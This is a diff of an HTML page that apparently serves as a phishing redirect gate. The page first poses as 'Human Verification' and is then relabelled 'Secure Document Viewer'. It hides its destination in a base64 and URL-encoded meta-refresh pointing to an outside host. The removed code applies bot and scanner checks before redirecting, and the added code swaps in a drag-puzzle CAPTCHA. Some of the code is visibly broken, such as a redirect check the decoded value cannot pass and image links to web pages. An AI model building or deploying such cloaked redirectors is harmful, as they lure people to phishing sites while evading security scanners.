@@ -2,97 +2,150 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Human Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Document Viewer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 100px;
-      background: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
     }
-    input, button {
-      font-size: 16px;
-      padding: 10px;
-      margin-top: 10px;
+    #captcha-container {
+      position: relative;
+      width: 400px;
+      height: 300px;
+      background-image: url('https://www.pexels.com/photo/colorful-puzzle-pieces-8385973/');
+      background-size: cover;
+      border: 2px solid #ccc;
+      margin-bottom: 20px;
     }
-    #redirect-message {
+    #puzzle-piece {
+      position: absolute;
+      width: 100px;
+      height: 100px;
+      background-image: url('https://www.pexels.com/photo/colorful-puzzle-pieces-8385973/');
+      background-size: cover;
+      cursor: pointer;
+    }
+    #modal {
       display: none;
-      font-weight: bold;
-      color: green;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+    }
+    #modal-content {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      text-align: center;
+    }
+    #code {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    #user-input {
+      width: 80px;
+      font-size: 24px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <h2>Security Check</h2>
-  <p id="captcha-question">Loading CAPTCHA...</p>
-  <input type="number" id="captcha-answer" placeholder="Your answer">
-  <br>
-  <button onclick="submitCaptcha()">Verify & Continue</button>
-  <p id="redirect-message">Redirecting...</p>
 
-  <script>
-    // 👇 PLACE YOUR BASE64 URL HERE
-    let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF"; 
+<div id="captcha-container">
+  <div id="puzzle-piece"></div>
+</div>
+<div id="modal">
+  <div id="modal-content">
+    <p id="code"></p>
+    <input type="text" id="user-input" placeholder="Enter code">
+  </div>
+</div>
 
-    // CAPTCHA and bot detection
-    let num1, num2;
-    let mouseMoved = false;
-    const startTime = Date.now();
+<script>
+  // Base64-encoded content (replace with your actual content)
+  const ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwczovL3g...ZGV0YXMlMjIlMjAvJTNF";
+  const modal = document.getElementById('modal');
+  const codeDisplay = document.getElementById('code');
+  const userInput = document.getElementById('user-input');
+  const puzzlePiece = document.getElementById('puzzle-piece');
 
-    window.addEventListener("mousemove", () => {
-      mouseMoved = true;
+  // Function to generate a random 2-digit number
+  function generateRandomCode() {
+    return Math.floor(Math.random() * 90) + 10;
+  }
+
+  // Function to show the modal with the CAPTCHA
+  function showCaptcha() {
+    const code = generateRandomCode();
+    codeDisplay.textContent = `Enter code: ${code}`;
+    modal.style.display = 'flex';
+
+    // Store the code in sessionStorage
+    sessionStorage.setItem('captchaCode', code);
+  }
+
+  // Function to hide the modal
+  function hideCaptcha() {
+    modal.style.display = 'none';
+  }
+
+  // Function to handle the puzzle piece drag
+  function handleDrag(e) {
+    const puzzleRect = puzzlePiece.getBoundingClientRect();
+    const containerRect = document.getElementById('captcha-container').getBoundingClientRect();
+
+    let offsetX = e.clientX - containerRect.left - puzzleRect.width / 2;
+    let offsetY = e.clientY - containerRect.top - puzzleRect.height / 2;
+
+    // Constrain the puzzle piece within the container
+    offsetX = Math.max(0, Math.min(containerRect.width - puzzleRect.width, offsetX));
+    offsetY = Math.max(0, Math.min(containerRect.height - puzzleRect.height, offsetY));
+
+    puzzlePiece.style.left = `${offsetX}px`;
+    puzzlePiece.style.top = `${offsetY}px`;
+
+    // Check if the puzzle piece is in the correct position
+    if (offsetX === 150 && offsetY === 100) { // Adjust these values based on your image
+      // Puzzle solved
+      alert('Puzzle solved!');
+      hideCaptcha();
+      // Proceed with your content display logic here
+    }
+  }
+
+  // Event listener for the puzzle piece drag
+  puzzlePiece.addEventListener('mousedown', (e) => {
+    e.preventDefault();
+    document.addEventListener('mousemove', handleDrag);
+    document.addEventListener('mouseup', () => {
+      document.removeEventListener('mousemove', handleDrag);
     });
+  });
 
-    function isHumanLike() {
-      return (
-        navigator.userAgent.length > 20 &&
-        'language' in navigator &&
-        'platform' in navigator &&
-        screen.width > 0 &&
-        screen.height > 0 &&
-        window.innerWidth > 0 &&
-        typeof window.DeviceOrientationEvent !== 'undefined'
-      );
+  // Show the CAPTCHA when the page loads
+  window.onload = showCaptcha;
+
+  // Verify the code entered by the user
+  userInput.addEventListener('input', () => {
+    const enteredCode = userInput.value;
+    const storedCode = sessionStorage.getItem('captchaCode');
+
+    if (enteredCode === storedCode) {
+      hideCaptcha();
+      // Proceed with your content display logic here
     }
+  });
+</script>
 
-    function generateCaptcha() {
-      num1 = Math.floor(Math.random() * 10) + 1;
-      num2 = Math.floor(Math.random() * 10) + 1;
-      document.getElementById("captcha-question").innerText = `What is ${num1} + ${num2}?`;
-    }
-
-    function submitCaptcha() {
-      const answer = parseInt(document.getElementById("captcha-answer").value, 10);
-      const elapsed = Date.now() - startTime;
-
-      if (
-        mouseMoved &&
-        isHumanLike() &&
-        answer === (num1 + num2) &&
-        elapsed > 1500
-      ) {
-        document.getElementById("redirect-message").style.display = "block";
-        
-        setTimeout(() => {
-          try {
-            const url = atob(ref);
-            if (url.startsWith("http")) {
-              window.location.href = url;
-            } else {
-              alert("Invalid redirect link.");
-            }
-          } catch (err) {
-            alert("Error decoding the redirect URL.");
-          }
-        }, 1000);
-      } else {
-        alert("Failed verification. Try again.");
-        document.getElementById("captcha-answer").value = "";
-        generateCaptcha();
-      }
-    }
-
-    window.onload = generateCaptcha;
-  </script>
 </body>
 </html>
